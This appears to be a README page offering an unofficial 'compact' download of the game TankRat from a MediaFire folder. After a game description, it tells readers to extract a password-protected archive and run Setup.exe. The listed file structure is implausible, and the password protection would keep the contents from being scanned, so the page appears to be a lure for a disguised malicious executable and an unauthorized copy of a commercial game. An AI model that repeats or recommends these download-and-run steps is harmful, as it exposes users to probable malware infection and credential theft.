## 🕹️ About

TankRat is a single-player action-adventure game developed by Alpha Channel and published by Kepler Interactive. Set in the post-apocalyptic Event Containment Area, it follows Whitaker, a digitized consciousness inhabiting a hardened drone called a Needle. Explore the wasteland, switch between the Needle and combat tanks, dismantle corrupted machines, salvage parts, and customize your rig while fighting toward the mysterious city of Highpoint. This compact release uses more efficient archive compression to reduce the download size; the game itself, including all content and gameplay, is unchanged.

TankRat is for players who enjoy atmospheric single-player action, third-person vehicle combat, exploration, and build-focused scavenging.

## ✨ Features

- 🔧 **Salvage and Customize** — Dismantle enemies, collect parts, and build a machine suited to your style.
- 🏜️ **Post-Apocalyptic Wasteland** — Explore the ruined Event Containment Area and uncover its buried secrets.
- 🛞 **Needle and Tank Combat** — Shift between an agile drone and powerful armored vehicles.
- 💥 **Vehicular Battles** — Fight corrupted drones, mech-monsters, and colossal TankRat bosses.
- 🌆 **Journey to Highpoint** — Push through the wasteland to discover the truth behind the Shroud.

### Step 1: Download

Download the compact archive from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the build expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- res.pak <- Resources archive
|-- license.wem <- Audio assets
|-- driver.pak <- Driver archive
|-- api.pak <- API modules
|-- uninstall.key <- Uninstall key
|-- scripts.lic <- Game scripts
|-- global.cfg <- Global settings
|-- driver.umap <- Driver data
|-- installer.dat <- Installer data
|-- patch_1.bnk <- Audio banks
|-- animations.dll <- Animation system
|-- audio.res <- Audio resources
|-- bootstrap.wem <- Bootstrap audio
|-- settings.bin <- Configuration
|-- update_1.ini <- Update config
|-- Password 2026.txt <- Password reminder (empty)
|-- license.bank <- License data
|-- physics.sys <- Physics engine
|-- assets.wem <- Asset audio
|-- update_1.res <- Update resources
|-- dlc.md5 <- DLC checksums
|-- lang.sys <- Language system
|-- localization.ini <- Language files
|-- launcher.dll <- Launcher library
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
